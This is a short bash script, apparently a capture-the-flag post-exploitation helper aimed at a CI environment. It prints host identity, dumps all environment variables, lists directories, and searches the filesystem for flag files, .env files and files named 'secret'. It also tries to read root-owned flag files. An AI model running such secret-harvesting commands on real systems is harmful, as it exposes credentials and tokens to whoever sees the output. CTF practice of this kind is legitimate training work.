#!/usr/bin/env bash
set -euo pipefail

echo "[+] Host info"
hostname
whoami
id
pwd

echo "[+] Environment variables"
env | sort

echo "[+] Interesting directories"
ls -la /
ls -la /opt || true
ls -la /opt/void || true
ls -la /home || true

echo "[+] Searching for flags"
find / -iname "*flag*" 2>/dev/null || true

echo "[+] Searching for secrets"
find / -iname "*.env" 2>/dev/null || true
find / -iname "*secret*" 2>/dev/null || true

echo "[+] CI FLAG"
cat /opt/void/ci_flag.txt || true

echo "[+] Root flag attempts"
cat /root/root.txt 2>/dev/null || true
cat /flag.txt 2>/dev/null || true
cat /root/flag.txt 2>/dev/null || true
